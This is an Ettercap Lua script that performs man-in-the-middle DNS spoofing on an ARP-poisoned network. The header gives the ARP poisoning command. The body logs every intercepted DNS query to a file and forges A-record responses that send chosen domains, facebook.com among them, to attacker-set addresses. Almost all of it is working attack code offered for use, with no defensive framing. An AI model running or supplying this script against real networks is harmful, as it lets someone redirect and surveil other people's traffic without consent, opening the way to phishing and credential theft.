-- dns_spoof_logger.lua
--
-- This script hooks into the DNS protocol dissector in Ettercap to:
--   1) Log queries and responses (similar to dns_logger.lua).
--   2) If a queried domain is in 'custom_hosts', we spoof the response with a chosen IP.
--
-- Usage:
--   - Place this script in /usr/share/ettercap/lua/scripts (or another accessible path).
--   - Run Ettercap in MITM mode (e.g., ARP poisoning) so it intercepts DNS traffic:
--       sudo ettercap -T -q -M arp:remote -i eth0 --lua-script=dns_spoof_logger.lua
--
-- Requirements:
--   - Ettercap >= 0.8.0 compiled with Lua support
--   - Either LuaJIT or a bitwise library for Lua (bit / bit32)
--
-- Logging:
--   - Outputs to the console via ettercap.log
--   - Appends to /tmp/dns_log.txt

description = "DNS logger + on-the-fly spoofing for selected domains"

-- -----------------------------
-- BEGIN USER CUSTOMIZATION
-- -----------------------------
-- Define domain-to-IP mappings here. If a domain is in this table, we'll serve a spoofed A record in the response.
local custom_hosts = {
  ["example.com"]      = "192.168.0.1",
  ["somewhere.local"]  = "192.168.50.10",
  ["facebook.com"]     = "127.0.0.2"
  -- add more as needed
}
-- -----------------------------
-- END USER CUSTOMIZATION
-- -----------------------------

local hook_points = require("hook_points")
local packet = require("packet")

-- Bitwise library (LuaJIT's 'bit' assumed)
local bit = require("bit")
local band   = bit.band
local rshift = bit.rshift

-- Hook the DNS dissector
hook_point = hook_points.dns

-- Open log file
local log_file = io.open("/tmp/dns_log.txt", "a")
if not log_file then
  ettercap.log("[-] Could not open /tmp/dns_log.txt for writing\n")
end

----------------------------------------------------------------------------
-- Function to build a minimal spoofed DNS response (A record).
-- We construct a new DNS packet from scratch:
--   - Transaction ID matches the original
--   - QR=1 (response), QDCOUNT=1, ANCOUNT=1
--   - Single question repeating the requested domain
--   - Single answer with an A record set to custom_ip
----------------------------------------------------------------------------
local function build_spoofed_response(transaction_id, qname, custom_ip)
  local function encode_domain(dname)
    local out = {}
    for label in dname:gmatch("[^%.]+") do
      table.insert(out, string.char(#label))
      table.insert(out, label)
    end
    table.insert(out, string.char(0)) -- null terminator
    return table.concat(out)
  end

  local function make_header(trx_id)
    local id_hi = math.floor(trx_id / 256)
    local id_lo = trx_id % 256
    return string.char(
      id_hi, id_lo,
      0x81, 0x80,  -- Flags: response, recursion available, no error
      0x00, 0x01,  -- QDCOUNT
      0x00, 0x01,  -- ANCOUNT
      0x00, 0x00,  -- NSCOUNT
      0x00, 0x00   -- ARCOUNT
    )
  end

  -- encode qname
  local encoded_qname = encode_domain(qname)

  -- question section: name + type (A) + class (IN)
  local question = encoded_qname ..
                   string.char(0x00, 0x01) ..  -- TYPE A
                   string.char(0x00, 0x01)    -- CLASS IN

  -- answer section:
  -- NAME = pointer to offset 12 (start of question domain name): 0xC00C
  local answer = string.char(0xC0, 0x0C) ..
                 string.char(0x00, 0x01) ..  -- TYPE A
                 string.char(0x00, 0x01) ..  -- CLASS IN
                 string.char(0x00, 0x00, 0x00, 0x3C) ..  -- TTL = 60s
                 string.char(0x00, 0x04)     -- RDLENGTH = 4 bytes for IPv4

  -- convert IP string to 4 bytes
  local ip_bytes = {}
  for seg in custom_ip:gmatch("%d+") do
    table.insert(ip_bytes, tonumber(seg))
  end

  local rdata = string.char(ip_bytes[1], ip_bytes[2], ip_bytes[3], ip_bytes[4])

  return make_header(transaction_id) .. question .. answer .. rdata
end
----------------------------------------------------------------------------
-- parse_dns_name: parse a label-encoded domain name from DNS payload
-- Returns: domain string, number of bytes consumed
----------------------------------------------------------------------------
local function parse_dns_name(payload, offset)
  local labels = {}
  local jumped = false
  local original_offset = offset
  local payload_len = #payload

  while offset <= payload_len do
    local len = payload:byte(offset)
    if not len then break end
    if len == 0 then
      offset = offset + 1
      break
    end
    -- Check if this is a pointer (compression)
    if band(len, 0xC0) == 0xC0 then
      local pointer_high = band(len, 0x3F)
      local pointer_low  = payload:byte(offset + 1) or 0
      local ptr_offset   = pointer_high * 256 + pointer_low + 1
      if ptr_offset > 0 and ptr_offset < offset then
        local name, _ = parse_dns_name(payload, ptr_offset)
        table.insert(labels, name)
      end
      offset = offset + 2
      jumped = true
      break
    else
      local part = payload:sub(offset+1, offset+len)
      table.insert(labels, part)
      offset = offset + len + 1
    end
  end

  local domain = table.concat(labels, ".")
  local consumed = offset - original_offset
  return domain, consumed
end

-- We'll keep track of queries in a global table so we can correlate query→response
_G.dns_queries = {}

----------------------------------------------------------------------------
-- packetrule: a sanity check; we let all DNS pass since we are hooking DNS
----------------------------------------------------------------------------
packetrule = function(p)
  if packet.is_tcp(p) == false and packet.is_udp then
    return true
  end
  return true
end

----------------------------------------------------------------------------
-- action: main logic to parse queries/responses, log them, and optionally spoof
----------------------------------------------------------------------------
action = function(p)
  local buf = packet.read_data(p)
  if not buf or #buf < 12 then return end

  local transaction_id = buf:byte(1)*256 + buf:byte(2)
  local flags_hi       = buf:byte(3)
  local flags_lo       = buf:byte(4)

  local qr     = (band(flags_hi, 0x80) ~= 0)
  local opcode = band(rshift(flags_hi, 3), 0x0F)
  local rcode  = band(flags_lo, 0x0F)

  local qd_count = buf:byte(5)*256 + buf:byte(6)
  local an_count = buf:byte(7)*256 + buf:byte(8)

  if not qr then
    -- DNS Query
    if qd_count < 1 then return end
    local offset = 13
    local qname, name_len = parse_dns_name(buf, offset)
    if not qname then return end
    offset = offset + name_len
    local qtype  = buf:byte(offset)*256 + buf:byte(offset+1)
    local qclass = buf:byte(offset+2)*256 + buf:byte(offset+3)

    local client_ip   = packet.src_ip(p) or "<unknown>"
    local client_port = packet.src_port(p) or 0
    local server_ip   = packet.dst_ip(p) or "<unknown>"

    local query_key = string.format("%s:%d-%s:%d",
                    client_ip, client_port, server_ip, transaction_id)
    _G.dns_queries[query_key] = {
      domain = qname,
      id     = transaction_id,
      client = client_ip
    }

    local qlog = string.format("[DNS-QUERY] %s asked for %s", client_ip, qname)
    ettercap.log(qlog.."\n")
    if log_file then
      log_file:write(qlog.."\n")
      log_file:flush()
    end

  else
    -- DNS Response
    local client_ip   = packet.dst_ip(p) or "<unknown>"
    local server_ip   = packet.src_ip(p) or "<unknown>"
    local client_port = packet.dst_port(p) or 0
    local query_key   = string.format("%s:%d-%s:%d",
                    client_ip, client_port, server_ip, transaction_id)

    local qname = nil
    if _G.dns_queries[query_key] then
      qname = _G.dns_queries[query_key].domain
      _G.dns_queries[query_key] = nil
    end
    if not qname then
      if qd_count >= 1 then
        local offset = 13
        local name = parse_dns_name(buf, offset)
        qname = name or "<unknown>"
      else
        qname = "<unknown>"
      end
    end

    local answers = {}
    if an_count > 0 then
      -- (Skipping real answer parse for brevity)
    end

    local spoof_ip = custom_hosts[qname]
    if spoof_ip then
      local new_payload = build_spoofed_response(transaction_id, qname, spoof_ip)
      packet.set_data(p, new_payload)

      -- If these functions exist, call them
      if packet.set_length then
        packet.set_length(p, #new_payload)
      end
      if packet.update_checksums then
        packet.update_checksums(p)
      end

      local slog = string.format("[DNS-SPOOF] %s => %s forcibly mapped to %s",
                                 client_ip, qname, spoof_ip)
      ettercap.log(slog.."\n")
      if log_file then
        log_file:write(slog.."\n")
        log_file:flush()
      end
      return
    else
      local slog
      if an_count == 0 then
        if rcode == 3 then
          slog = string.format("[DNS] %s → %s => NXDOMAIN", client_ip, qname)
        else
          slog = string.format("[DNS] %s → %s => No IP answer", client_ip, qname)
        end
      else
        slog = string.format("[DNS] %s → %s => [Got %d answer(s)]", client_ip, qname, an_count)
      end

      ettercap.log(slog.."\n")
      if log_file then
        log_file:write(slog.."\n")
        log_file:flush()
      end
    end
  end
end
